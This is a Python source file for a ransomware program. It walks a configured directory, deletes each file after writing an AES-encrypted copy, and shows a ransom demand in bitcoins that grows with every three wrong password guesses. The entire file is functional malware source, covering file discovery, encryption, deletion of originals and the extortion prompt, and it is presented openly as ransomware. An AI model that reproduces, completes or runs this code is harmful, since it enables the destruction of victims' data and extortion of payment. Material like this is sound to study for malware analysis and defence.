from typing import List
import pyaes # type: ignore
import os
from database.database import *
import conf


class Ransomware():
   
   db: Database = Database()
   password: bytes = db.get_password()
   aes: pyaes.aes.AESModeOfOperationCTR = pyaes.AESModeOfOperationCTR(password)

   def __init__(self, /) -> None:
      pass
   
   
   def encrypt(self, paths: List[str]) -> None:
      for path in paths:
         if not path.endswith(conf.ENCRIPTED_FILE_EXTENSION):
            file_data: bytes = self.read_file(path)
            try:
               encrypted_filename: str = path.split("\\")[-1] + conf.ENCRIPTED_FILE_EXTENSION
               current_path: str = "C:\\" + os.path.join(*path.split("\\")[1:-1])
               with open(os.path.join(current_path, encrypted_filename), "wb") as f:
                  f.write(self.aes.encrypt(file_data))
            except Exception:
               pass


   def decrypt(self, paths: List[str], password: bytes) -> bool:
      for path in paths:
         file_data: bytes = self.read_file(path)
         try:
            d: pyaes.aes.AESModeOfOperationCTR = pyaes.AESModeOfOperationCTR(password)
            decript_data: bytes = d.decrypt(file_data)
            filename: str = path.split(conf.ENCRIPTED_FILE_EXTENSION)[0]
            with open(filename, "wb") as f:
               f.write(decript_data)
         except:
            return False
      return True
   
   
   def read_file(self, path) -> bytes:
      with open(path, "rb") as f:
         file_data: bytes = f.read()
      os.remove(path)
      return file_data
            
   
   def catch_files_path(self) -> List[str]:
      paths: List[str] = []
      for path, _, files in os.walk(conf.STARTS_IN):
         if path not in conf.IGNORE_PATHS:
            for file in files:
               paths.append(os.path.join(path, file))
      return paths
   
   
   def inside_out(self, paths: List[str]) -> List[str]:
      return sorted(paths, key = lambda path: path.count("\\"), reverse = True)
   
   
   def show_message(self) -> None:
      os.system("cls")
      print("Your files have been encrypted!")
      print("Every three attempts the number of bitcoins increases by one")
      print(f"Attempts number: {Ransomware.db.get_attempts()}")
      print(f'Rescue: {Ransomware.db.get_bitcoins()} bitcoins!')
      
      
   def get_password(self) -> bytes:
      while True:
         self.show_message()
         password: str = str(input("Enter the password to decrypt: "))
         if password.encode() == Ransomware.password:
            return password.encode()
         self.increment_attempts_and_bitcoins(Ransomware.db.get_attempts())
   
   
   def increment_attempts_and_bitcoins(self, attempts: int) -> None:
      if ((attempts + 1) % 3) == 0:
         bitcoins: int = int((attempts + 1) / 3)
         Ransomware.db.set_bitcoins(bitcoins + 1)
      Ransomware.db.set_attempts(attempts + 1)

   
   def start(self) -> None:
      is_encrypted: bool = Ransomware.db.get_is_encrypted()
      if is_encrypted:
         password: bytes = self.get_password()
         if password:
            paths: List[str] = self.catch_files_path()
            is_decrypted: bool = self.decrypt(paths, password)
            if is_decrypted:
               Ransomware.db.set_is_encrypted(False)
               Ransomware.db.reset_settings_table_values()
      else:
         paths = self.catch_files_path()
         paths = self.inside_out(paths)
         self.encrypt(paths)
         Ransomware.db.set_is_encrypted(True)
         self.start()


def main():
   rans: Ransomware = Ransomware()
   rans.start()


if __name__ == "__main__":
   main()